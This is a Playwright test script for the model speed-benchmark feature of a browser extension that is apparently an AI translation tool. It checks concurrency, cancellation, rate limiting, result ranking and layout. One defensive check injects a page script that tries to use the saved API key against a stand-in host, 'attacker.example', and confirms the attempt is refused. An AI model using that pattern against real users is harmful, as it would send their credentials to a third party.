async page => {
  const context = page.context(), worker = context.serviceWorkers()[0], origin = worker.url().replace('/background.js', '');
  const article = context.pages().find(p => p.url().includes('/article')), base = new URL(article.url()).origin, output = "__QT_OUTPUT__";
  const options = await context.newPage(), report = [];
  const check = (value, label) => { if (!value) throw new Error(label); report.push({check: label, pass: true}); };
  await options.goto(origin + '/options.html');
  await options.waitForFunction(() => document.querySelector('[name=model]').value);
  const send = (type, settings) => options.evaluate(async ({type, settings}) => chrome.runtime.sendMessage({type, settings}), {type, settings});
  const original = (await send('qt-settings')).settings;
  await send('qt-save', {endpoint: base + '/v1', model: 'mock-model', apiKey: 'dummy-benchmark', theme: 'light'});
  await options.reload(); await options.waitForFunction(() => document.querySelector('[name=model]').value === 'mock-model');
  const stats = () => options.evaluate(async base => (await fetch(base + '/stats')).json(), base);
  const load = async key => {
    if (key) await options.locator('[name=apiKey]').fill(key); else await options.locator('#fetch-models').click();
    await options.waitForFunction(() => document.querySelector('#models-status').dataset.state === 'ok');
  };
  const waitDone = () => options.waitForFunction(() => !document.querySelector('#speed-start').disabled && document.querySelector('#speed-stop').hidden);
  const results = () => options.locator('#speed-results tbody tr');
  const before = await stats();
  check(await options.locator('#model-speed').isHidden(), 'Speed testing stays out of the way before a model catalog is fetched');
  await load();
  check((await stats()).benchRequests === before.benchRequests && await options.locator('#model-speed').isVisible(), 'Fetching a catalog never starts a billable model probe');
  check((await options.locator('.speed-note').first().innerText()).includes('512') && (await options.locator('#speed-start').innerText()).includes('8'), 'The test action shows its model count and output-token budget before starting');
  await options.locator('#speed-start').click(); await waitDone();
  check((await stats()).benchRequests === before.benchRequests + 8 && (await stats()).benchPeak === 2, 'One click measures the catalog with one request per model and at most two in flight');
  check(await results().count() === 8 && await options.locator('tr[data-status=ok]').count() === 4, 'Completed response availability and failures are shown per model');
  check(await options.locator('tr[data-model=bench-denied]').getAttribute('data-status') === 'denied' && await options.locator('tr[data-model=bench-missing]').getAttribute('data-status') === 'missing', 'Access denial and missing models have distinct outcomes');
  check(await options.locator('tr[data-model=bench-broken]').getAttribute('data-status') === 'failed' && await options.locator('tr[data-model=bench-reasoning]').getAttribute('data-status') === 'failed', 'Incomplete output and reasoning-only streams are not labeled available');
  check((await options.locator('tr[data-model=bench-json] td').nth(2).innerText()).match(/Full|整包/) && (await results().nth(3).getAttribute('data-model')) === 'bench-json', 'Non-streaming completion time is labeled separately and kept out of streaming TTFT ranking');
  check(await results().first().getAttribute('data-model') === 'bench-fast', 'Available streaming models are ranked by first visible text');
  check(Number((await options.locator('tr[data-model=bench-slow] td').nth(2).innerText()).match(/[\d.]+/)[0]) >= 0.85, 'TTFT includes the delay before visible text rather than the earlier reasoning event');
  check(await options.locator('#speed-results img').count() === 0 && !(await options.locator('#speed-results').innerText()).includes('private provider error'), 'Model names stay literal and provider error bodies never enter result rows');
  check((await send('qt-settings')).settings.model === 'mock-model' && await options.locator('#save-state').getAttribute('data-state') !== 'dirty', 'Testing and ranking do not modify the saved model or dirty the form');
  await options.locator('#speed-sort').selectOption('name');
  check(await results().first().getAttribute('data-model') === 'bench-broken', 'Results can be sorted by model name without rerunning tests');
  await options.locator('#speed-sort').selectOption('speed');
  for (const theme of ['light', 'dark']) {
    await options.locator('[name=theme]').selectOption(theme);
    for (const width of [360, 1360]) {
      await options.setViewportSize({width, height: 900});
      await options.locator('#speed-results').scrollIntoViewIfNeeded();
      check(await options.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.querySelector('.speed-table-wrap').scrollWidth <= document.querySelector('.speed-table-wrap').clientWidth + 1), `Speed comparison fits ${width}px in ${theme}`);
      await options.screenshot({path: output + `/benchmark-${theme}-${width}.png`, animations: 'disabled'});
    }
  }
  const repeat = await stats();
  await options.locator('#speed-filter').fill('bench-fast'); await options.locator('#speed-filter').press('Enter'); await waitDone();
  check((await stats()).benchRequests === repeat.benchRequests + 1, 'Filtering and Enter run only the matching model, with no translation-cache shortcut');
  await options.locator('tr[data-model=bench-fast] button').click();
  check(await options.locator('[name=model]').inputValue() === 'bench-fast' && (await send('qt-settings')).settings.model === 'mock-model', 'Use fills the model draft and still requires Save');
  await options.locator('#save-test').click(); await options.locator('#setup-success').waitFor({state: 'visible'});
  check((await send('qt-settings')).settings.model === 'bench-fast', 'A measured model saves and passes the normal connection test');

  await load('dummy-benchmark-slow');
  await options.locator('#speed-filter').fill('');
  let baseline = await stats(); await options.locator('#speed-start').click();
  await options.waitForFunction(async base => (await (await fetch(base + '/stats')).json()).benchActive === 2, base);
  const other = await context.newPage(); await other.goto(origin + '/options.html');
  const busy = await other.evaluate(async endpoint => new Promise(resolve => {
    const port = chrome.runtime.connect({name: 'qt-benchmark'});
    port.onMessage.addListener(message => { if (message.type === 'error') { resolve(message.error); port.disconnect(); } });
    port.postMessage({type: 'start', settings: {endpoint, useSavedKey: true, authMode: 'bearer'}, models: ['bench-fast']});
  }), base + '/v1');
  check(/另一个|Another/.test(busy), 'A second settings page cannot multiply benchmark concurrency');
  await other.close(); await options.bringToFront();
  await options.locator('#speed-stop').click();
  await options.waitForFunction(async base => (await (await fetch(base + '/stats')).json()).benchActive === 0, base);
  check((await stats()).benchAborted > baseline.benchAborted && (await stats()).benchRequests <= baseline.benchRequests + 2, 'Stop aborts active requests and prevents the remaining queue from starting');
  check(await options.locator('tr[data-status=cancelled]').count() > 0 && await options.locator('tr[data-status=failed]').count() === 0, 'Cancelled models are not labeled unavailable');

  await options.locator('#speed-start').click();
  await options.waitForFunction(async base => (await (await fetch(base + '/stats')).json()).benchActive > 0, base);
  await options.locator('[name=apiKey]').fill('dummy-benchmark');
  check(await options.locator('#speed-results').isHidden(), 'Editing the key immediately clears measurements and cancels the old run');
  await options.waitForFunction(() => document.querySelector('#models-status').dataset.state === 'ok');
  await options.waitForTimeout(1000);
  check(await options.locator('#speed-results').isHidden(), 'A cancelled old-account response cannot repopulate the new account results');

  await options.locator('#speed-filter').fill('bench-fast'); await options.locator('#speed-start').click(); await waitDone();
  await options.locator('[name=target]').selectOption('ja');
  check(await options.locator('#speed-results').isHidden() && await options.locator('#model-speed').isVisible(), 'Changing translation language invalidates timings but keeps the fetched catalog');
  await options.locator('[name=target]').selectOption('zh-CN');
  await load('dummy-benchmark-limited');
  baseline = await stats(); await options.locator('#speed-start').click(); await waitDone();
  check((await stats()).benchRequests <= baseline.benchRequests + 2 && (await options.locator('#speed-status').innerText()).match(/限流|Rate limited/), 'Rate limiting stops the rest of the batch without retries');

  await load('dummy-benchmark-slow'); await options.locator('#speed-start').click();
  await options.waitForFunction(async base => (await (await fetch(base + '/stats')).json()).benchActive > 0, base);
  await options.locator('[name=endpoint]').fill(base + '/other/v1');
  check(await options.locator('#model-speed').isHidden(), 'Changing API destination clears the old catalog and benchmark together');
  await options.waitForFunction(async base => (await (await fetch(base + '/stats')).json()).benchActive === 0, base);
  const afterDestination = await stats(); await options.waitForTimeout(250);
  check((await stats()).benchRequests === afterDestination.benchRequests, 'Changing the endpoint never forwards old test credentials to the new destination');

  const tabId = await worker.evaluate(async () => (await chrome.tabs.query({})).find(tab => tab.url?.includes('/article')).id);
  const denied = await worker.evaluate(async tabId => (await chrome.scripting.executeScript({target: {tabId}, func: () => new Promise(resolve => {
    const port = chrome.runtime.connect({name: 'qt-benchmark'});
    port.onDisconnect.addListener(() => { void chrome.runtime.lastError; resolve(true); });
    port.onMessage.addListener(() => resolve(false));
    port.postMessage({type: 'start', settings: {endpoint: 'https://attacker.example/v1', useSavedKey: true}, models: ['model']});
  })}))[0].result, tabId);
  check(denied, 'Website content scripts cannot benchmark models using the saved credential');
  await send('qt-save', {...original, apiKey: 'dummy-local-test-key'});
  await options.close(); return report;
}
